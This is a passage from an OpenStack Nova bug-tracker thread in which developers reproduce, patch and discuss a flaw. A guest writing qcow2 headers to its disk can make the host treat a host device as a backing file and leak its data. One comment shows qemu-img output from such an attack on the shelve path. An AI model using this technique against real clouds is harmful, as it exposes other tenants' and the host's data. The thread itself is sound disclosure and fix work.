            <time itemprop="commentTime" datetime="2016-02-25T17:57:22.308953+00:00" title="2016-02-25 17:57:22 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sean, come talk to me at summit. We&#x27;ll get along just fine :)</p>
<p>Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don&#x27;t want to be using ext3 any more for ephemeral disks. It&#x27;s problematic for more reasons than just security: <a rel="nofollow" href="https://bugs.launchpad.net/nova/+bug/1547582">https:/<wbr />/bugs.launchpad<wbr />.net/nova/<wbr />+bug/1547582</a> .</p>
<p>My libvirt storage pools series is a huge cleanup in this area, and I&#x27;m not done yet. It&#x27;s how I discovered both this CVE and the one from last month.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sean, come talk to me at summit. We'll get along just fine :)

Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: https://bugs.launchpad.net/nova/+bug/1547582 .

My libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~berrange" class="sprite person">Daniel Berrange (berrange)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T18:12:19.948078+00:00" title="2016-02-25 18:12:19 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that  is pretty much is always unsafe.  I&#x27;m fine with that being a patch we do later though.</p>
<p>The patch from Lee looks reasonable to me.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that  is pretty much is always unsafe.  I'm fine with that being a patch we do later though.

The patch from Lee looks reasonable to me.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T19:15:24.202269+00:00" title="2016-02-25 19:15:24 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I&#x27;ve not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving  process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I&#x27;ll look into this tomorrow morning.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving  process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T19:39:53.532549+00:00" title="2016-02-25 19:39:53 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T21:59:55.820749+00:00" title="2016-02-25 21:59:55 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn&#x27;t work with ephemeral disk and by default nova doesn&#x27;t allow resize on the same host... Finally the patch doesn&#x27;t apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova using &quot;patch -p2&quot;:<br />
patching file virt/libvirt/<wbr />driver.<wbr />py<br />
Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).<br />
Hunk #2 FAILED at 7195.</p>
<p>The failed hunk contains unresolved symbols: on_execute, on_completion and compression that needs to be removed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using "patch -p2":
patching file virt/libvirt/driver.py
Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).
Hunk #2 FAILED at 7195.

The failed hunk contains unresolved symbols: on_execute, on_completion and compression that needs to be removed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T00:50:44.613281+00:00" title="2016-02-26 00:50:44 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>And it seems like the shelve issue is real and not fixed by the propose patch.<br />
After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:</p>
<p>&nbsp;7084 ?        Ssl    1:05 /usr/bin/python /usr/bin/<wbr />nova-compute<br />
11792 ?        Sl     2:40  \_ qemu-img convert -f qcow2 -O qcow2   \<br />
&nbsp;&nbsp;/var/<wbr />lib/nova/<wbr />instances/<wbr />f531dd97-<wbr />3e5c-4f2c-<wbr />88fb-740e97c3f0<wbr />d2/disk \<br />
&nbsp;&nbsp;/var/<wbr />lib/nova/<wbr />instances/<wbr />snapshots/<wbr />tmpSLRPxG/<wbr />f345630013ca4fe<wbr />0a29b203e2b3afa<wbr />61</p>
<p># openstack-config --get /etc/nova/nova.conf libvirt use_cow_images<br />
False</p>
<p># qemu-img info /var/lib/<wbr />nova/instances/<wbr />f531dd97-<wbr />3e5c-4f2c-<wbr />88fb-740e97c3f0<wbr />d2/disk<br />
image: /var/lib/<wbr />nova/instances/<wbr />f531dd97-<wbr />3e5c-4f2c-<wbr />88fb-740e97c3f0<wbr />d2/disk<br />
file format: qcow2<br />
virtual size: 100G (107374182400 bytes)<br />
disk size: 5.0G<br />
cluster_size: 65536<br />
backing file: /dev/vda1<br />
backing file format: raw<br />
Format specific information:<br />
&nbsp;&nbsp;&nbsp;&nbsp;compat: 1.1<br />
&nbsp;&nbsp;&nbsp;&nbsp;lazy refcounts: false</p>
<p># qemu-img info /var/lib/<wbr />nova/instances/<wbr />snapshots/<wbr />tmpSLRPxG/<wbr />f345630013ca4fe<wbr />0a29b203e2b3afa<wbr />61<br />
image: /var/lib/<wbr />nova/instances/<wbr />snapshots/<wbr />tmpSLRPxG/<wbr />f345630013ca4fe<wbr />0a29b203e2b3afa<wbr />61<br />
file format: qcow2<br />
virtual size: 100G (107374182400 bytes)<br />
disk size: 7.5G<br />
cluster_size: 65536<br />
Format specific information:<br />
&nbsp;&nbsp;&nbsp;&nbsp;compat: 1.1<br />
&nbsp;&nbsp;&nbsp;&nbsp;lazy refcounts: false</p>
<p>The snapshot is still growing and likely to contain the controller disk, I&#x27;ll check again tomorrow if the user can retrieve it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">And it seems like the shelve issue is real and not fixed by the propose patch.
After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:

 7084 ?        Ssl    1:05 /usr/bin/python /usr/bin/nova-compute
11792 ?        Sl     2:40  \_ qemu-img convert -f qcow2 -O qcow2   \
  /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \
  /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

# openstack-config --get /etc/nova/nova.conf libvirt use_cow_images
False

# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
image: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 5.0G
cluster_size: 65536
backing file: /dev/vda1
backing file format: raw
Format specific information:
    compat: 1.1
    lazy refcounts: false


# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
image: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 7.5G
cluster_size: 65536
Format specific information:
    compat: 1.1
    lazy refcounts: false


The snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T10:11:19.644283+00:00" title="2016-02-26 10:11:19 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sean, Dan B,</p>
<p>The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info *before* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.</p>
<p>There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I&#x27;m running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don&#x27;t use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I&#x27;m working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that&#x27;s fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.</p>
<p>The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:</p>
<p>1. What the expected format is of the image that it is downloading.<br />
2. That it is even downloading an image at all.</p>
<p>Its only option with the current structure is to call the callback and test what it got. My series splits this into create_from_func() for ephemeral and swap disks, and create_from_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create_from_func() is here: <a rel="nofollow" href="https://review.openstack.org/#/c/282580/">https:/<wbr />/review.<wbr />openstack.<wbr />org/#/c/<wbr />282580/</a> . It needs updating and it&#x27;s not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.</p>
<p>[1] <a rel="nofollow" href="https://review.openstack.org/#/c/279626/">https:/<wbr />/review.<wbr />openstack.<wbr />org/#/c/<wbr />279626/</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sean, Dan B,

The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info *before* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.

There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.

The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:

1. What the expected format is of the image that it is downloading.
2. That it is even downloading an image at all.

Its only option with the current structure is to call the callback and test what it got. My series splits this into create_from_func() for ephemeral and swap disks, and create_from_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create_from_func() is here: https://review.openstack.org/#/c/282580/ . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.

[1] https://review.openstack.org/#/c/279626/</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T11:54:03.904948+00:00" title="2016-02-26 11:54:03 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/1548450/comments/32/+download">Download full text</a> (4.5 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks Tristan, was this on your rdo kilo env? This looks like you&#x27;ve hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I&#x27;m following up with the RDO team to ensure this version is available now.</p>
<p>Looking into the unshelve case we appear protected by a check within nova/virt/<wbr />images.<wbr />fetch_to_<wbr />raw that correctly detects that a backing_file is now listed and blocks any attempt at unshelving the instance :</p>
<p>2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [req-e3d11cbb-<wbr />3a55-4eaa-<wbr />ac99-592c751209<wbr />ea 4e15d42d6f2d40c<wbr />781b3097315a835<wbr />af 37e7ea4bcdfc471<wbr />191ea1267e7e6b4<wbr />e0 - - -] [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9] Instance failed to spawn<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9] Traceback (most recent call last):<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/compute/<wbr />manager.<wbr />py&quot;, line 4316, in _unshelve_instance<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     block_device_<wbr />info=block_<wbr />device_<wbr />info)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 2516, in spawn<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     admin_pass=<wbr />admin_password)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 2940, in _create_image<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     instance, size, fallback_from_host)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 6409, in _try_fetch_<wbr />image_cache<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     size=size)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 240, in cache<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     *args, **kwargs)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 472, in create_image<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]     prepare_<wbr />template(<wbr />target=<wbr />base, max_size=size, *args, **kwargs)<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-<wbr />2083-4987-<wbr />8197-fd56d6ce38<wbr />e9]   File &quot;/usr/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />oslo_concurrenc<wbr />y/lockutils.<wbr />py&quot;, line 254, in inner<br />
2016-02-26 06:40:17.248 3903 ERROR nova.compute.<wbr />manager [instance: 8dcd132e-20...</p></div>
    
    <p>
      <a href="/nova/+bug/1548450/comments/32">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now. 

Looking into the unshelve case we appear protected by a check within nova/virt/images.fetch_to_raw that correctly detects that a backing_file is now listed and blocks any attempt at unshelving the instance :

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 4316, in _unshelve_instance
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     block_device_info=block_device_info)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2516, in spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     admin_pass=admin_password)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2940, in _create_image
